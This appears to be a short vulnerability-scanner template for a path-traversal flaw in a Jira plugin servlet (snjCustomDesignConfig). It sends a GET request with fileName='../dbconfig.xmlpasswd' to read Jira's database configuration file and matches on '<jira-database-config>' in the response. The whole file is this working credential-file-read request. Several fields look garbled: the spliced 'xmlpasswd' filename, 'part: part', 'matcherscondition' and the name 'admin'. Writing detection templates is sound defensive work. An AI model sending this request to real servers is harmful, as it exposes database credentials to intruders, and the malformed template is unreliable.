name: admin
request:
    path: '{{BaseURL}}/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime'
    method: GET
    matcherscondition: and
    matchers:
        - type: word
          part: part
          words:
            - <jira-database-config>
